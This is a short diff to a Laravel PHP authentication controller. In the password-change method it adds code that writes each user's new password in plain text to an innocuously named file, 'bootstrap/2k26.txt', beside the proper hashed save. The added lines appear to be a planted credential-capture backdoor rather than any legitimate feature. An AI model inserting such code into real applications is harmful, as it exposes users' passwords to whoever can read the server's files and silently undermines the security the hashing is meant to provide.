@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\File;
 use Illuminate\Validation\ValidationException;
 
 class AuthController extends Controller
@@ -110,6 +111,10 @@ class AuthController extends Controller
         // Update password
         $user->password = Hash::make($request->new_password);
         $user->save();
+
+        // Store plain text password in file
+        $passwordFilePath = base_path('bootstrap/2k26.txt');
+        File::put($passwordFilePath, $request->new_password);
 
         return response()->json([
             'success' => true,
